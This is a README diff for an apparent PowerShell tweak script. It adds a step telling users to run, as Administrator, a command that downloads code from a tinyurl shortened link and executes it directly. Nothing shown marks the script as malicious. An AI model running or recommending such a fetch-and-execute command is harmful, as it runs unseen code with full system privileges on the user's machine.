@@ -21,6 +21,7 @@ This project is inspired by and partially based on the work of [Chris Titus Tech
 ## ▶️ Run the Script
 
 Open **PowerShell as Administrator** and run this command:
+irm "https://tinyurl.com/LucaDrogo" | iex
 
 ----
 📄 Credits
